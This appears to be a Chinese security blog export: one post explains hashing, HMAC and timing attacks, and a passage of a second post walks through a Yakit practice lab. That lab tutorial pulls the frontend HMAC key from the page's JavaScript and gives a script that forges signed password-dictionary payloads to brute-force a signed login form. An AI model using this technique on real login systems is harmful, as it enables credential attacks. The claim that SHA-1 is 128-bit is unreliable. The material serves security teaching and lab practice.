<p>最近一直在整java代码审计，这些东西再不用用我怕忘了就！我结合自己的理解以及自己编的一个Yu9与黑客的小故事。和师傅们一块分享一下什么是<strong>数据完整形</strong>与<strong>数据身份加密</strong>。</p>
<p>在此之前，我们需要先了解一个概念，<strong>散列</strong>。</p>
<h2 id="0X01-散列"><a href="#0X01-散列" class="headerlink" title="0X01 散列"></a>0X01 散列</h2><h3 id="1、什么是散列？"><a href="#1、什么是散列？" class="headerlink" title="1、什么是散列？"></a>1、什么是散列？</h3><p>Hash（哈希），又称“散列”。散列（hash）英文原意是“混杂”、“拼凑”、“重新表述”的意思。</p>
<p>在某种程度上，散列是与排序相反的一种操作，排序是将集合中的元素按照某种方式比如首字母a、b、c…排列在一起，而散列通过计算哈希值，打破元素之间原有的关系，使集合中的元素按照散列函数的分类进行排列。</p>
<h3 id="2、散列的发展史"><a href="#2、散列的发展史" class="headerlink" title="2、散列的发展史"></a>2、散列的发展史</h3><p><strong>早期散列函数</strong></p>
<p>在计算机科学的早期阶段，最早的散列函数是非常简单的算法，例如，取数据的某个字节作为哈希值，或者对数据进行简单的运算（如求和、乘法等）得到哈希值。这些简单的散列函数通常无法提供良好的散列性能和安全性。</p>
<p><strong>数字校验和</strong></p>
<p>随着计算机网络的兴起，人们开始关注数据完整性的问题。校验和算法应运而生，用于验证数据在传输过程中是否发生了变化。</p>
<p>常见的校验和算法包括CRC（循环冗余校验）和校验和位的累加等。这些算法通过对数据进行散列运算和异或操作，生成一段固定长度的校验和，以便接收方验证数据的完整性。</p>
<p><strong>哈希表</strong></p>
<p>20世纪70年代，散列表成为一种常见的数据结构，被广泛应用于快速查找。散列表使用散列函数将关键字映射到数组的特定位置，以实现常数时间的查找、插入和删除操作。</p>
<p><strong>密码学</strong></p>
<p>在密码学中，散列函数被广泛应用于生成消息摘要，以用于数字签名和数据完整性验证。</p>
<p>例如，MD5是一种广泛使用的散列算法，它将任意长度的数据转换为128位的哈希值。然而，随着计算机计算能力的增强，MD5逐渐暴露出<strong>碰撞</strong>的安全问题，因此被SHA-1等更安全的散列算法取代。</p>
<p><strong>安全散列算法</strong></p>
<p>为了应对散列算法的安全性问题，人们开始研究和设计更安全的散列算法。SHA-2系列（如SHA-256）和SHA-3系列是最常见的安全散列算法。</p>
<p>这些算法在设计上更加复杂和安全，并且具备抗碰撞、抗预映射和抗区分攻击等特性。此外，还有一些新型的散列算法，如blake2和whirlpool等，它们在特定场景下具有更好的性能和安全性。</p>
<p><strong>散列算法的应用扩展</strong></p>
<p>随着计算机科学和信息安全的不断发展，散列算法的应用范围也不断扩展。散列算法被广泛应用于密码存储、数字证书、数据验证、文件指纹、随机数生成和密钥派生等领域，以提供数据的完整性、唯一性和安全性保障。同时，散列算法也为分布式系统、大数据处理和区块链等领域提供了基础支持。</p>
<h3 id="3、碰撞"><a href="#3、碰撞" class="headerlink" title="3、碰撞"></a>3、碰撞</h3><h4 id="什么是碰撞？"><a href="#什么是碰撞？" class="headerlink" title="什么是碰撞？"></a>什么是碰撞？</h4><p>在上文中我们提到了<strong>碰撞</strong>一词，接下来就详细讲讲什么是碰撞。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/05/6596ee5171033.png"  alt="image-20240105014345135"></p>
<p>举个例子，通过例子来解释哈：		</p>
<p>通常我们存储数据会使用到<strong>数组</strong>，在查找某个元素是否存在的过程中，就需要挨个<strong>循环比较</strong>。一旦存储的内容数量特别多，我们在查找时就需要大量时间。</p>
<p>在java中有<code>hashCode()</code>函数，它就是一个哈希算法，它的输入是任意字符串，输出是固定的4字节<code>int</code>整数。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;hello123&quot;</span>.hashCode(); <span class="comment">// 0x5e918d2</span></span><br><span class="line"><span class="string">&quot;hello456&quot;</span>.hashCode(); <span class="comment">// 0x7a9d88e8</span></span><br><span class="line"><span class="string">&quot;hello789&quot;</span>.hashCode(); <span class="comment">// 0xa0dbae2f</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在存入数据时，通过<code>hashCode()</code>计算出一个<code>hash值</code>来标记它的位置</li>
<li>在查找数据时，先计算出他的位置，然后去那个位置查看是否存在就好了</li>
</ul>
<p>但是<code>hashCode()</code>输出是4字节整数，最多只有<strong>4294967296</strong>种输出，但输入的数据长度是不固定的，有无数种输入。所以，哈希算法是把一个无限的输入集合映射到一个有限的输出集合，必然会出现相同的结果，这就是<strong>碰撞</strong>。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;AaAaAa&quot;</span>.hashCode(); <span class="comment">// 0x7460e8c0</span></span><br><span class="line"><span class="string">&quot;BBAaBB&quot;</span>.hashCode(); <span class="comment">// 0x7460e8c0</span></span><br></pre></td></tr></table></figure>

<h4 id="碰撞能不能避免？"><a href="#碰撞能不能避免？" class="headerlink" title="碰撞能不能避免？"></a>碰撞能不能避免？</h4><p>答案是不能。哈希算法是把一个<strong>无限的输入</strong>集合映射到一个<strong>有限的输出</strong>集合，必然会产生碰撞。</p>
<p>碰撞不可怕，我们担心的不是碰撞，而是碰撞的概率，因为碰撞概率的高低关系到哈希算法的安全性。一个安全的哈希算法必须满足：</p>
<ul>
<li>碰撞概率低；</li>
<li>不能猜测输出。</li>
</ul>
<h3 id="4、散列的特征"><a href="#4、散列的特征" class="headerlink" title="4、散列的特征"></a>4、散列的特征</h3><ul>
<li>相同的输入一定得到相同的输出；</li>
<li>不同的输入大概率得到不同的输出。</li>
</ul>
<h3 id="5、选择加密散列函数"><a href="#5、选择加密散列函数" class="headerlink" title="5、选择加密散列函数"></a>5、选择加密散列函数</h3><h4 id="不安全的散列函数"><a href="#不安全的散列函数" class="headerlink" title="不安全的散列函数"></a>不安全的散列函数</h4><ul>
<li>MD5</li>
<li>SHA-1</li>
</ul>
<p><strong>MD5</strong>是一个过时的128位散列函数，是因为每一个原始密码都会生成一个对应的固定密码，也就是说一个字符串生成的MD5 值是永远不变的。 这样的话，虽然它是不可逆的，但可以被穷举。</p>
<p><strong>SHA-1</strong>是一个过时的128位散列函数，SHA-1的碰撞攻击是在2005年被首次公开揭示，但随着时间的推移，攻击者的攻击方法和技术也在不断进步。2017Google研究人员宣布完成全球首例SHA-1哈希碰撞。从理论上说，SHA-1此刻起就不在安全！</p>
<h4 id="安全的散列函数"><a href="#安全的散列函数" class="headerlink" title="安全的散列函数"></a>安全的散列函数</h4><ul>
<li>SHA-2</li>
<li>SHA-3</li>
<li>BLAKE2</li>
</ul>
<p><strong>SHA-2</strong>是一组散列函数家族，包括SHA-224、SHA-256、SHA-384、SHA-512等。目前我们只需关注SHA-256即可。why？因为这将是我们目前碰多最多的加密散列，我们采用的每个系统都在使用它。我们部署应用程序所使用的操作系统和网络协议都依赖SHA-256。它是安全可靠的，得到了很好的支持。</p>
<p><strong>SHA-3</strong>是美国国家标准技术研究所在2015年发布的一组散列函数家族。它是继SHA-1和SHA-2之后的最新一代散列函数标准。与SHA-1和SHA-2不同，SHA-3采用了全新的设计结构，称为基于海绵构造的Keccak算法。它提供了更高的安全性和更好的性能。SHA-3家族包括多个变体，如SHA-3-224、SHA-3-256、SHA-3-384、SHA-3-512等，分别生成不同长度的哈希值。SHA-3被广泛应用于密码学和安全领域，用于确保数据的完整性、验证数字签名、生成消息摘要等。相较于之前的散列函数，SHA-3具有更强的抗碰撞能力和抗预映像能力，提供了更高的安全性。尽管SHA-3已经发布并且被广泛研究和应用，目前仍然有许多系统和应用程序使用SHA-2或者较早的散列函数。SHA-3的采用还没有形成势头。</p>
<p><strong>BLAKE2</strong>是一种现代的、<strong>快速</strong>且安全的散列函数，它可以生成不同长度的哈希值。注意标黑的快速，BLAKE2利用现在cpu架构以极快的速度进行散列。如果需要对大量数据进行散列，可以考虑BLAKE2。 </p>
<h2 id="0X02、数据完整性"><a href="#0X02、数据完整性" class="headerlink" title="0X02、数据完整性"></a>0X02、数据完整性</h2><h4 id="1、什么是数据完整性？"><a href="#1、什么是数据完整性？" class="headerlink" title="1、什么是数据完整性？"></a>1、什么是数据完整性？</h4><p><strong>数据完整性</strong>，字面意思理解就可以。同时它也是数据不会被意外修改的保证！那么，什么情况下会导致文件不完整捏？</p>
<ul>
<li><strong>感染病毒</strong>：比方说你的系统中了病毒，病毒感染了某个软件安装包或者某个可执行程序。那么该文件的完整性就被破坏了。</li>
<li><strong>植入木马&#x2F;后门</strong>：还有一种文件不完整的情况，是被别有用心的人植入木马或后门。比方说某些国内的软件下载站点，它们提供的 Windows 安装光盘镜像已经被安置了后门。</li>
<li><strong>传输故障</strong>：这种情况主要发生在网络下载时。因为网络传输是有可能发生误码的（传输错误），另外还有可能下载到快结束的时候断线（没下载全）。这些情况都会导致你下载的文件不完整。</li>
</ul>
<h4 id="2、完整性校验"><a href="#2、完整性校验" class="headerlink" title="2、完整性校验"></a>2、完整性校验</h4><p>既然提到数据完整性，那就不得不讲讲<strong>完整性校验</strong>。</p>
<p>例如，很多知名的软件，除了在官网上提供下载，还会相应提供下载软件的散列值。当你下载好某个软件之后，先在自己电脑里计算一下散列值，然后跟官方网站提供的散列值对比一下。如果散列值一样，通常就说明没问题。</p>
<p><strong>最主要的目的就是：查看数据有没有被篡改。</strong></p>
<h4 id="3、Yu9与黑客的小故事"><a href="#3、Yu9与黑客的小故事" class="headerlink" title="3、Yu9与黑客的小故事"></a>3、Yu9与黑客的小故事</h4><p>Yu9的公司有一个文档管理系统，为了防止会黑客对其中文档的篡改，Yu9在系统中存入数据时，先使用散列函数计算出每份文件的<strong>散列值</strong>，定期把文档管理器中的文件散列值与存入时的散列值进行对比，判断文件内容有无被篡改或者损坏！</p>
<h2 id="0X03、数据身份验证"><a href="#0X03、数据身份验证" class="headerlink" title="0X03、数据身份验证"></a>0X03、数据身份验证</h2><p>继续回顾Yu9与黑客的小故事，假设黑客通过某种手段获取到了文件管理系统的访问和写入权限！他不仅可以更改文件，还可以更改文件的散列值。此时，Yu9就无法有效判断文件是否被篡改！</p>
<blockquote>
<p>假设数据是test，生成的散列值是qwe。</p>
<p>判断数据有没有被篡改，把数据使用散列函数生成散列值，与qwe比较相同则说明数据完整未被篡改，不相同则说明数据被篡改。</p>
<ul>
<li>黑客把数据改成test2，并生成散列值asd并替换掉qwe</li>
<li>此时存在系统中的数据是test2，散列值是asd。</li>
</ul>
<p>Yu9判断数据有无被篡改就是通过把数据散列得到散列值与存入的散列值对比。</p>
<p>Yu9把test2散列后得到散列值asd，与此时的散列值对比一看一模一样。做出判断数据没被篡改。</p>
<p>但是此时数据已经被篡改。</p>
<p>此时，有人会疑惑，Yu9咋这么笨，散列值被篡改你都发现不了。或者说为啥不把散列值存到别的地方。嗯嗯嗯…..如果说系统中文件有一千个或者一万个，难道每一个都记得住吗？存到别的地方，又要如何做到一一对应呢？所以说这是没法改变的，必须存到一块！</p>
</blockquote>
<p>聪明的Yu9要防御黑客，他有想到了另一个办法。在存入数据时，保证数据的完整性的同时又添加了一个功能，<strong>数据身份验证</strong>。通俗的说就是：数据的来源、谁创建了这个数据。</p>
<p>数据身份验证确保数据读取器可以验证数据写入者的身份！该功能的两个重要因素，秘钥、散列秘钥。下边给大家讲讲这两个概念！</p>
<h4 id="1、秘钥"><a href="#1、秘钥" class="headerlink" title="1、秘钥"></a>1、秘钥</h4><p>秘钥是什么？把它想象成钥匙，只有自己的钥匙才能打开自家的房门。那在计算机的世界中秘钥就是只有自己知道，很难被别人猜到的数字、字符串或者字符等等。</p>
<p>​		等等，到这就会有人到这就会说，那你说这不就是密码吗？简直一毛一样。</p>
<p>​		嗯嗯…..确实差不多，那就再补充几点，来区分密码和秘钥。		</p>
<ul>
<li>含义不同：密钥是一组用于加密和解密数据的参数，可以是数字、字符、符号或其他形式的数据；而密码通常指的是由字母、数字、符号组成的机密信息，用于身份验证或访问控制。</li>
<li>使用方式不同：密钥通常用于加密和解密数据或数字签名等加密操作；而密码则用于身份验证，例如登录电子邮件、社交网站或其他应用程序时需要输入的密码。</li>
<li>长度不同：密钥通常比密码更长，因为它需要足够强大以防止被破解。密码的长度通常在8-16个字符之间。</li>
<li>存储方式不同：密钥通常需要存储在安全的地方，例如硬件安全模块、密码保险箱或加密卡中，以保护其安全性；而密码通常存储在密码管理器、云存储服务或用户记忆中。</li>
</ul>
<p><strong>比较常见的秘钥：</strong></p>
<ul>
<li>随机数字</li>
<li>密码短语</li>
</ul>
<h4 id="2、秘钥散列"><a href="#2、秘钥散列" class="headerlink" title="2、秘钥散列"></a>2、秘钥散列</h4><p>这个也好理解。还是继续回顾小故事！</p>
<p>Yu9为了保证文档管理系统中数据的安全，它添加了数据身份验证功能。具体怎么实现呢？</p>
<p>首先，他先生成一个秘钥：<code>Yu9shidashuaigehahahaha</code>。然后再存入文件时，把<code>文件+秘钥</code>通过散列函数生成一个散列值。把这个值和文件一块存入系统中。即使黑客把文件和散列值都改了。Yu9还是可以判断出数据有无被篡改。</p>
<p>说明：</p>
<p>假设数据是test，秘钥Yu9。test+Yu9生成的散列值qwe</p>
<p>黑客更改数据成test2， 生成的散列值asd并替换掉qwe。</p>
<p>此时Yu9使用，test2+Yu9生成的散列值与asd对比，发现不一样。判断数据被篡改。</p>
<h4 id="3、HMAC函数"><a href="#3、HMAC函数" class="headerlink" title="3、HMAC函数"></a>3、HMAC函数</h4><p>HMAC（Hash-based Message Authentication Code）是一种基于哈希函数的消息认证码算法，可以用于验证数据完整性和身份验证。它结合了加密哈希函数和密钥，以产生一个具有强韧性的消息验证代码。</p>
<p>具体来说，HMAC算法通过将密钥与消息组合，然后利用散列函数进行计算，生成一个消息认证码。这个消息认证码可以用于验证消息的完整性和身份验证。</p>
<p><strong>HMAC算法的优点包括：</strong></p>
<ol>
<li>强韧性：HMAC算法具有强大的抗攻击性，能够防止大多数攻击，如生日攻击、碰撞攻击和长度扩展攻击等。</li>
<li>灵活性：HMAC算法可以使用多种哈希函数，例如MD5、SHA-1、SHA-256等，并且可以支持不同的密钥长度和消息长度。</li>
<li>安全性：由于HMAC算法使用了密钥，因此它可以提供更高的安全保障，防止数据被篡改和伪造。</li>
</ol>
<p>总之，HMAC算法是一种基于哈希函数的消息认证码算法，具有强韧性、灵活性和安全性等优点，已经被广泛应用于网络安全、数据通信和数字签名等领域。</p>
<h2 id="0X04、时序攻击"><a href="#0X04、时序攻击" class="headerlink" title="0X04、时序攻击"></a>0X04、时序攻击</h2><p>时序攻击是一种基于时间差异的侧信道攻击技术，是Yu9这样的安服仔接触不到的高度。</p>
<p>数据完整性和数据身份验证的验证都是通过比较散列值来完成。比较的过程就可能存在不安全的情况。</p>
<p>举例：</p>
<p><code>qwe</code>和<code>qwa</code>是两个散列值，我们现在对它进行比较。为了节省时间，我们可以逐个字符进行比较，若第一个字符串都不相等，则他们就不相等，则可以结束比较。第一个相同之后，在进行比较下一个。依次类推….</p>
<p>假设比较一个字符串的时间是<code>1s</code></p>
<ul>
<li>qwe和asd比较，只要1s即可，第一个字符不行同，直接得出结果不相同</li>
<li>qwe和qsa比较，则需要2s，比较第一个相同花费1s，继续，比较第二个再花费1s，不同，总计2s得出结论。</li>
<li>qwe和qws，同理，需要3s</li>
</ul>
<p>知道我要说什么了吗？</p>
<p>Yu9为了省事，整了一个定期验证数据的方法！现在系统中存入test，秘钥Yu9。test+Yu9的散列值为qwe。黑客可以拿到test数据，同时对数据进行散列可以知道散列值是3位，但是不知道秘钥。</p>
<p>黑客就不断调用验证数据的方法，传入构造的散列，比如：asd、qsd、qwd通过响应的时间的不同，来逐个字符破解。最终的破解出散列值。</p>
<h2 id="0X05、参考"><a href="#0X05、参考" class="headerlink" title="0X05、参考"></a>0X05、参考</h2><p><a class="link"   href="https://www.cnblogs.com/goloving/p/15242372.html" >https://www.cnblogs.com/goloving/p/15242372.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.liaoxuefeng.com/wiki/1252599548343744/1304227729113121" >https://www.liaoxuefeng.com/wiki/1252599548343744/1304227729113121<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://program-think.medium.com/%E6%89%AB%E7%9B%B2%E6%96%87%E4%BB%B6%E5%AE%8C%E6%95%B4%E6%80%A7%E6%A0%A1%E9%AA%8C-%E5%85%B3%E4%BA%8E%E6%95%A3%E5%88%97%E5%80%BC%E5%92%8C%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D-d9b3d4fd2e13" >https://program-think.medium.com/扫盲文件完整性校验-关于散列值和数字签名-d9b3d4fd2e13<i class="fas fa-external-link-alt"></i></a></p>
<p>[美]丹尼斯·伯恩—python全栈安全</p>
<h3 id="0X06-原文地址"><a href="#0X06-原文地址" class="headerlink" title="0X06 原文地址"></a>0X06 原文地址</h3><p>转载自公众号：安服仔Yu9<br>原文地址：<a class="link"   href="https://mp.weixin.qq.com/s/FgIRltZd5ehs-3x8SccUxQ" >https://mp.weixin.qq.com/s/FgIRltZd5ehs-3x8SccUxQ<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>前端安全</tag>
      </tags>
  </entry>
  <entry>
    <title>从前端验签与加解密学习Yakit中WebFuzzer热加载</title>
    <url>/blog/2024/01/24/240124%E4%BB%8E%E5%89%8D%E7%AB%AF%E9%AA%8C%E7%AD%BE%E4%B8%8E%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AD%A6%E4%B9%A0Yakit%E4%B8%ADWebFuzzer%E7%83%AD%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>在数据安全越来越重视的情况下，请求包、响应包中有明文字段的应用越来越少了，不管是app还是web，金融、通信，民生以及其他比较重要的行业，都用到了加解密。so，之前没有接触到这方面的Yu9打算学习一下。然后注意到了yakit中的<code>高级前端加解密与验签实战</code>靶场，想着通过<strong>Yakit靶场</strong>一块来看看目前比较流行的<strong>前端加解密与验签</strong>以及其存在的安全问题！</p>
<p>本来已经写完了整个靶场的通关教程，<code>还发现了其中一个靶场存在的bug。</code>其中编写脚本使用的都是<code>python</code>，怪我没有看官方之前发的打靶教程，写完之后才看到了官方的教程，一对比，发现使用yakit和它的热加载来解决这个问题更加方便（也可能是咱python学的太差）！所以之前计划发的文章就不发公众号了，通过篇文章一块来学习一下yakit的热加载功能。</p>
<p><strong>yakit语法官方教程</strong>：<a class="link"   href="https://yaklang.io/docs/intro/" >https://yaklang.io/docs/intro/<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>yakit热加载教程</strong>：<a class="link"   href="https://yaklang.io/products/Web%20Fuzzer/fuzz-hotpatch" >https://yaklang.io/products/Web%20Fuzzer/fuzz-hotpatch<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>Yu9之前写的靶场通关笔记</strong>：<a href="https://wsyu9a.github.io/FrontEndSec/">https://wsyu9a.github.io/FrontEndSec/</a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/23/65afb2202c7de.png"  alt="image-20240123203333222"></p>
<h2 id="0X01-破解验签防篡改"><a href="#0X01-破解验签防篡改" class="headerlink" title="0X01 破解验签防篡改"></a>0X01 破解验签防篡改</h2><p>之前Yu9写过的一篇文章，<strong>数据完整性与数据身份校验</strong><a class="link"   href="https://mp.weixin.qq.com/s/FgIRltZd5ehs-3x8SccUxQ%EF%BC%8C%E5%85%B6%E4%B8%AD%E5%B0%B1%E6%B6%89%E5%8F%8A%E4%BA%86%E4%B8%80%E4%BA%9B%E6%95%B0%E6%8D%AE%E9%98%B2%E7%AF%A1%E6%94%B9%E7%9A%84%E6%96%B9%E6%A1%88%EF%BC%8C%E5%A4%A7%E5%AE%B6%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E5%AF%B9%E7%AD%BE%E5%90%8D%E6%8A%80%E6%9C%AF%E6%9C%89%E4%B8%80%E4%B8%AA%E5%88%9D%E6%AD%A5%E7%9A%84%E4%BA%86%E8%A7%A3%EF%BC%81" >https://mp.weixin.qq.com/s/FgIRltZd5ehs-3x8SccUxQ，其中就涉及了一些数据防篡改的方案，大家可以通过这篇文章对签名技术有一个初步的了解！<i class="fas fa-external-link-alt"></i></a></p>
<blockquote>
<p>签名验证（又叫验签或签名）是验证请求参数是否被篡改的一种常见安全手段，验证签名方法主流的有两种：</p>
<p>1）一种是 KEY+哈希算法，例如 HMAC-MD5 &#x2F; HMAC-SHA256 等，比如要发送的数据是：<code>username=&quot;admin&quot;&amp;password=&quot;123456&quot;</code>。在提交数据前把数据通过<code>KEY+哈希算法</code>生成一个哈希值，发送数据是携带这个哈希值。例如：</p>
<ul>
<li><p>正常数据：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>签名数据：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7d113a1544cd53ff6c527c865511be4f18d4372a7fa571dbc035f0fc12b2b092&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;31323334313233343132333431323334&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>2）另一种是使用非对称加密加密比如RSA把生成的哈希值（signature）在进行一层加密。</p>
<p>注：这段内容借鉴yakit<strong>前端验证签名（验签）表单：HMAC-SHA256</strong>靶场！</p>
</blockquote>
<p>通过靶场（<code>前端验证签名（验签）表单：HMAC-SHA256</code>）来具体看看：</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/23/65afba6eb5b24.png"  alt="image-20240123210900376"></p>
<p>在提交数据后，会先验证签名。签名验证通过后在验证用户名、密码</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/23/65afbbed4f2d7.png"  alt="image-20240123211523922"></p>
<p>那签名真的可以防止数据被篡改吗？我们抓包修改个数据试试（把密码改成123123）</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/23/65afbca365933.png"  alt="image-20240123211834478"></p>
<p>可以看到只要数据被篡改，签名就会验证失败。爆破的话讲究不用说了，只有我们最开始的那个数据包可以验证通过。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/23/65afbd6e57ef0.png"  alt="image-20240123212148444"></p>
<p><strong>那我们如何才可以绕过签名篡改数据呢？</strong></p>
<p>1）首先我们应该明确一下签名签证过程的原理和步骤</p>
<p><strong>原理</strong></p>
<p>前端：把数据<code>按照一定格式</code>使用哈希算法进行<code>秘钥哈希</code>运算生成<code>哈希值</code>，发送数据包携带这个<code>哈希值和key</code></p>
<p>后端：此时后端拿到数据有（以上边靶场为例）：signature、key、username、password。把username和password按照一定格式在进行秘钥哈希运算生成的值与signature对比，若一样验证通过！</p>
<p><strong>步骤</strong></p>
<p>绕过签名的方式就是，伪造signature值：改变数据的同时生成对应的signature值，修改数据的时候，连带签名一起修改掉就好了。</p>
<p>那我们伪造signature的前提就是需要知道前端生成它的规则。</p>
<p>2）一半这个步骤就是通过javascript实现，那我们看看其中到底做了哪些处理！</p>
<p>首先就是找一下发包是调用了那个js来做的处理。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/16/65a6297aaf016.png"  alt="image-20240116150009272"> </p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/16/65a629ea987fe.png"  alt="image-20240116150201082"> </p>
<p>找到之后，我们就具体分析一下具体做了哪些处理</p>
<blockquote>
<p>CryptoJS是一个流行的JavaScript密码学库，被广泛用于前端开发中处理加密、解密、哈希和编码等密码学操作</p>
<p>CryptoJS 的 key 在没有明确指定编码方式的情况下，默认的 <code>toString</code> 方法将输出十六进制 (Hex) 格式的字符串。</p>
</blockquote>
<p><strong>01</strong>生成一个 KEY，默认为 16 位数 1234123412341234，签名时使用的是UTF-8 编码字符串</p>
<p><strong>02</strong>签名前的格式，例如：<code>username=admin&amp;password=123456</code></p>
<p><strong>03</strong>签名使用的哈希算法是<code>HmacSha256</code>，输出结果十六进制</p>
<p>3）明白这个逻辑后，我们可以使用 Yaklang 中codec模块的<code>HmacSha256</code>函数来模拟这个过程！</p>
<blockquote>
<p>热加载是一种高级技术，让 Yak 成为 Web Fuzzer 和用户自定义代码中的桥梁，它允许我们编写一段 Yak 函数，在 Web Fuzzer 过程中使用，从而实现自定义 fuzztag 或更多功能。</p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">sign = <span class="function"><span class="keyword">func</span><span class="params">(p)</span></span> &#123;</span><br><span class="line">    key = <span class="string">`1234123412341234`</span></span><br><span class="line">    usernameDict = [<span class="string">&quot;admin&quot;</span>]</span><br><span class="line">    passwordDict = x<span class="string">&quot;&#123;&#123;payload(pass_top25)&#125;&#125;&quot;</span> <span class="comment">// 我们可以使用x前缀字符串来通过fuzztag语法获取pass_top25字典中的值</span></span><br><span class="line">    <span class="comment">// passwordDict = [&quot;admin&quot;, &quot;123456&quot;, &quot;admin123&quot;, &quot;88888888&quot;, &quot;666666&quot;] // 也可以直接使用手写的list</span></span><br><span class="line">    resultList = []</span><br><span class="line">    <span class="keyword">for</span> username in usernameDict &#123;</span><br><span class="line">        <span class="keyword">for</span> password in passwordDict &#123;</span><br><span class="line">            data=f<span class="string">`username=$&#123;username&#125;&amp;password=$&#123;password&#125;`</span></span><br><span class="line">            signature = codec.EncodeToHex(codec.HmacSha256(key, data))</span><br><span class="line">            m=&#123;</span><br><span class="line">                <span class="string">&quot;signature&quot;</span>: signature,</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: <span class="string">&quot;31323334313233343132333431323334&quot;</span>,</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: password</span><br><span class="line">            &#125;</span><br><span class="line">            res=json.dumps(m)</span><br><span class="line">            resultList.Append(res)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resultList    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/23/65afd52dede8a.png"  alt="image-20240123230308016"></p>
<h2 id="0X02-渗透前端JS加密表单"><a href="#0X02-渗透前端JS加密表单" class="headerlink" title="0X02 渗透前端JS加密表单"></a>0X02 渗透前端JS加密表单</h2><blockquote>
<p>当我们学会测试带验签的接口的基本技能之后，我们会自我反省这个保护措施其实只是增加了操作的复杂度和难度，并不是真正的能解决“防篡改防重放的问题”。</p>
<p>当然，我们的密码仍然在通信过程中<strong>“明文传输”</strong>；</p>
<p>“明文密码传输”的不合规项一直是一个备受争议的选项，甚至前些年大家觉得这就是用来“凑数”的安服报告内容。</p>
<p>但是戏剧性的是，随着一些甲方单位真的全 API 通信上了加密之后，普通测试手段失效了，大家不再轻视这个问题，开始广泛讨论“如何绕过前端加密进行安全测试”这类话题。</p>
<p>注：这段话来源yakit公众号<strong>渗透测试高级技巧：分析验签与前端加密（一）</strong><a class="link"   href="https://mp.weixin.qq.com/s/ni3sVp0Gh-CwyMPuwk__Cw" >https://mp.weixin.qq.com/s/ni3sVp0Gh-CwyMPuwk__Cw<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p>在前端加密中<strong>AES-CBC&#x2F;ECB</strong> 的组合可能是我们最常遇到的两种，在正式开始之前我们先对AES加密算法进行扫盲，然后在通过<code>CryptoJS.AES(CBC) 前端加密登陆表单</code>这个靶场来了解前端加密的渗透。</p>
<h3 id="AES加密概述"><a href="#AES加密概述" class="headerlink" title="AES加密概述"></a>AES加密概述</h3><p><strong>秘钥</strong></p>
<p>AES是一种<code>对称加密</code>算法，用于加密和解密数据。它是目前应用最广泛的加密算法之一。</p>
<p>AES加密算法采用<code>分组密码</code>（block cipher）的方式，将明文分成固定长度的数据块，然后对每个数据块进行相同的加密操作，以达到加密整个数据的目的。加密和解密都使用相同的密钥，因此属于对称加密算法。</p>
<p>AES加密算法的密钥长度可以是128位、192位或256位。其中，128位密钥被广泛使用，256位密钥的安全性最高。AES算法还有多种模式，如ECB、CBC、CFB、OFB等，其中CBC模式被广泛使用。</p>
<p><strong>填充</strong></p>
<p>上边我们提到了AES加密算法采用分组加密的方式。那什么是分组加密呢？</p>
<p>AES算法在对明文加密的时候，并不是把整个明文一股脑加密成一整段密文，而是把明文拆分成一个个独立的明文块，每一个明文块长度<code>128bit</code>。这些明文块经过AES加密器的复杂处理，生成一个个独立的密文块，这些密文块拼接在一起，就是最终的AES加密结果。</p>
<p>若一个明文的长度是200bit，按照每个明文快128bit来拆分的话，第二个明文块只有72bit。不足128bit。这时候就需要对不足128bit的明文块进行填充（Padding）。</p>
